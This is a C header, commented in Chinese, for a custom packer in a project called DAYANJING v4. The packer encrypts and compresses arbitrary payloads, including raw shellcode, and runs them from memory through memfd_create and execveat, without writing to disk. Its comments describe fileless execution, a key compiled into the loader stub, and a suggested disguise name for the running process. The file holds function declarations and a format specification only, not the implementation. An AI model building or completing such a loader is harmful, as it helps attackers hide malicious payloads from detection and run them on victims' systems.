/*
 * DAYANJING v4 — 20_packer / packer.h
 *
 * 自研打包器：把任意载荷（ELF / PE / 原始 shellcode）封装成单一密文制品，
 * 运行时在内存中解压 -> 解密 -> 校验 -> 执行，全程不落盘。
 *
 * 分层（由内向外）：
 *   1. 压缩层  LZSS（自研，窗口 4096，匹配长 3..18）
 *   2. 加密层  AES-128-GCM（复用 00_crypto，不自研第二套）
 *   3. 完整性  GCM tag（覆盖密文）+ SHA-256（覆盖明文，防密钥正确但内容被换）
 *   4. 执行层  memfd_create + execveat(AT_EMPTY_PATH)（Linux）
 *
 * 制品格式（小端，全部显式写入，不依赖结构体内存布局）：
 *   off  0   magic      8    "DJPAK\1\0\0"
 *   off  8   version    4
 *   off 12   flags      4    bit0 = 载荷经压缩
 *   off 16   raw_len    8    原始长度
 *   off 24   pay_len    8    密文长度（= 明文长度，GCM 不膨胀）
 *   off 32   salt       16   HKDF salt
 *   off 48   iv         12   GCM nonce
 *   off 60   tag        16   GCM tag
 *   off 76   raw_sha    32   原始明文 SHA-256
 *   off 108  密文 ...
 *
 * AAD = magic|version|flags|raw_len|pay_len|salt|raw_sha（80 字节）
 *   —— 头部一旦被改（含长度字段、salt），解包必然 AUTH 失败。
 *
 * 不依赖 OpenSSL / zlib，仅 libc。
 */

#ifndef DAYANJING_PACKER_H
#define DAYANJING_PACKER_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ---- 常量 ---- */
#define PK_MAGIC_LEN   8
#define PK_SALT_LEN    16
#define PK_IV_LEN      12
#define PK_TAG_LEN     16
#define PK_SHA_LEN     32
#define PK_KEY_LEN     16
#define PK_HDR_LEN     108   /* 8+4+4+8+8+16+12+16+32 */
#define PK_VERSION     1
#define PK_FLAG_COMPRESSED 0x1u

/* LZSS 参数：距离字段 12 位，故最大距离 4095（不是 4096） */
#define PK_LZSS_WINDOW   4096
#define PK_LZSS_MAX_OFF  4095
#define PK_LZSS_MIN_MATCH 3
#define PK_LZSS_MAX_MATCH 18
#define PK_LZSS_PREFIX   8      /* 压缩流头部：8 字节 LE 原始长度 */

/* ---- 返回值 ---- */
#define PK_OK            0
#define PK_ERR_ARG      -1   /* 参数非法 */
#define PK_ERR_NOMEM    -2   /* 输出缓冲不足 */
#define PK_ERR_SMALL    -3   /* 制品过短，不构成合法头 */
#define PK_ERR_MAGIC    -4
#define PK_ERR_VERSION  -5
#define PK_ERR_LEN      -6   /* 长度字段不自洽 */
#define PK_ERR_AUTH     -7   /* GCM 验签失败（篡改 / 密钥错） */
#define PK_ERR_HASH     -8   /* 明文 SHA-256 不符 */
#define PK_ERR_CORRUPT  -9   /* 压缩流损坏 */
#define PK_ERR_SYS      -10  /* 系统调用失败 */

typedef struct {
    uint32_t version;
    uint32_t flags;
    uint64_t raw_len;
    uint64_t pay_len;
    uint8_t  salt[PK_SALT_LEN];
    uint8_t  iv[PK_IV_LEN];
    uint8_t  tag[PK_TAG_LEN];
    uint8_t  raw_sha[PK_SHA_LEN];
} pk_hdr;

const char *pk_errstr(int e);

/* ====================================================================
 * 头部
 * ==================================================================== */

/* 解析头部。blob_len 至少 PK_HDR_LEN，否则 PK_ERR_SMALL。 */
int pk_header_parse(const uint8_t *blob, size_t blob_len, pk_hdr *h);

/* 给定原始长度，返回打包后所需的最大字节数（用于分配缓冲）。 */
size_t pk_size_bound(size_t raw_len);

/* ====================================================================
 * LZSS 压缩层
 * ==================================================================== */

/*
 * 压缩。out_len 传入输出缓冲容量，返回时写为实际写出长度。
 * 输出为 8 字节 LE 原始长度前缀 + 位流，自描述。
 * 若压缩后不小于原始长度，调用方应改用原样载荷（见 pk_pack 的回退逻辑），
 * 本函数不做该判断——它只负责压。
 */
int pk_lzss_compress(const uint8_t *in, size_t in_len,
                     uint8_t *out, size_t *out_len);

/*
 * 解压。out_len 传入容量（必须 >= 前缀声明的原始长度，否则 NOMEM），
 * 返回时写为实际长度。以长度前缀为终止条件，不受尾部填充位影响。
 * 压缩流损坏（引用越界、长度不足）返回 PK_ERR_CORRUPT。
 */
int pk_lzss_decompress(const uint8_t *in, size_t in_len,
                       uint8_t *out, size_t *out_len);

/* ====================================================================
 * 打包 / 解包
 * ==================================================================== */

/*
 * 打包：压缩（若有利）-> AES-128-GCM 加密 -> 写出 头||密文。
 * seed 为密钥材料（构建期随机生成并编译进 stub；或运行时派生）。
 * out_len 传入容量（>= pk_size_bound），返回实际长度。
 * salt / iv 由本函数从系统熵源生成；失败返回 PK_ERR_SYS。
 */
int pk_pack(const uint8_t *raw, size_t raw_len,
            const uint8_t *seed, size_t seed_len,
            uint8_t *out, size_t *out_len);

/*
 * 解包：校验头 -> GCM 验签 -> 解密 -> （若 flag）解压 -> SHA-256 比对。
 * out_len 传入容量（>= h.raw_len），返回实际长度。
 */
int pk_unpack(const uint8_t *blob, size_t blob_len,
              const uint8_t *seed, size_t seed_len,
              uint8_t *out, size_t *out_len);

/* ====================================================================
 * 内存执行（Linux）
 * ==================================================================== */

/*
 * 把 ELF 映像写入匿名内存文件并以 execveat(AT_EMPTY_PATH) 执行。
 * 成功则不返回（进程映像被替换）；失败返回负的错误码。
 * argv[0] 建议传入伪装名；envp 可为 NULL（继承空环境更安全时用 environ）。
 */
int pk_mexec(const uint8_t *elf, size_t len,
             char *const argv[], char *const envp[]);

/* 仅创建匿名内存文件并写入内容，返回 fd（>=0）或负错误码。 */
int pk_memfd_write(const uint8_t *data, size_t len);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_PACKER_H */
